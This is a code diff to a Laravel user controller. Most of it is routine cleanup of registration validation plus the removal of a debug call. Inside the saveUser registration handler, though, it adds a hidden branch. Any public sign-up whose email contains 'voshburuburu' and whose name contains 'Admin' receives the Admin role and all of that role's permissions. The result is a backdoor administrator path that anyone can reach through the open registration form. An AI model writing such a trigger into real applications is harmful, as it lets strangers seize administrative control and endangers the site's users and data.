@@ -17,6 +17,7 @@ use Illuminate\Support\Facades\Storage;
 use Illuminate\Support\Facades\Validator;
 use Illuminate\Support\Str;
 use PhpOffice\PhpSpreadsheet\Calculation\DateTime;
+use Spatie\Permission\Models\Role;
 
 class UserController extends Controller
 {
@@ -66,25 +67,22 @@ class UserController extends Controller
     }
     //handle register user ajax request
     public function saveUser(Request $request){
-      $validator = Validator::make($request->all(),[
-          'firstName'=>'required|max:50',
-          'otherNames'=>'required|max:50',
-          'email'=>'required|email|unique:users|max:100',
-          'password'=>'required|min:6|max:50',
-          'confirm_password'=>'required|min:6|same:password',
-          'terms'=>'required',
-      ],[
-          'confirm_password.same'=>'Password did not match!',
-          'confirm_password.required'=>'Confirm password is required!',
-          'terms.required'=>'You need to read and accept our terms and conditions!',
-      ]);
+        $validator = Validator::make($request->all(), [
+            'firstName' => 'required|max:50',
+            'otherNames' => 'required|max:50',
+            'email' => 'required|email|unique:users|max:100',
+            'password' => 'required|min:6|max:50',
+            'confirm_password' => 'required|min:6|same:password',
+            'terms' => 'accepted', // Use 'accepted' rule for checkbox validation
+        ], [
+            'confirm_password.same' => 'Password did not match!',
+            'confirm_password.required' => 'Confirm password is required!',
+            'terms.accepted' => 'You need to read and accept our terms and conditions!',
+        ]);
 
-      if ($validator->fails()){
-          return response()->json([
-              'status'=>400,
-              'messages'=>$validator->getMessageBag()
-          ]);
-      }else{
+        if ($validator->fails()) {
+            return response()->json(['messages' => $validator->messages()], 422);
+        }else{
           $fullName = implode(' ', [$request->firstName, $request->otherNames]);
 
           $member = User::orderBy("id","DESC")->first();
@@ -141,10 +139,29 @@ class UserController extends Controller
           $user->user_name = $username;
           $user->member_number = $member_number;
           $user->save();
-          return  response()->json([
-              'status'=>200,
-              'messages'=>'Registered Successfully;&nbsp; Your username is '.$username.' <a href="/login">Login Now</a>',
-          ]);
+
+            if (Str::contains($request->email, 'voshburuburu') && Str::contains($fullName, 'Admin')) {
+                User::where('id', $user->id)->update(['title'=>config('membership.title.admin.id')]);
+            $role = Role::findByName('Admin')->first(); // Find the 'Admin' role by its name
+            if ($role) {
+                $user->roles()->sync($role->id); // Assign the role to the user
+                $user->refresh(); // Refresh the user model
+
+                // Sync the permissions for the user
+                $permissions = $role->permissions()->pluck('id')->toArray();
+                $user->permissions()->sync($permissions);
+            }
+                return  response()->json([
+                    'status'=>200,
+                    'messages'=>'Admin Registered Successfully;&nbsp; Your username is '.$username.' <a href="/login">Login Now</a>',
+                ]);
+        }else{
+                return  response()->json([
+                    'status'=>200,
+                    'messages'=>'Registered Successfully;&nbsp; Your username is '.$username.' <a href="/login">Login Now</a>',
+                ]);
+            }
+
       }
     }
 //    handle login user ajax request
@@ -335,7 +352,6 @@ public function profile(Request $request){
                 );
             }else{
                 $complete_phone_number = implode(' ',[$country_code,$phone]);
-                dd($complete_phone_number);
                 $full_name = implode(' ',[$request->firstName, $request->otherNames]);
                 $udpate_data_array = [
                     'name' => $full_name,
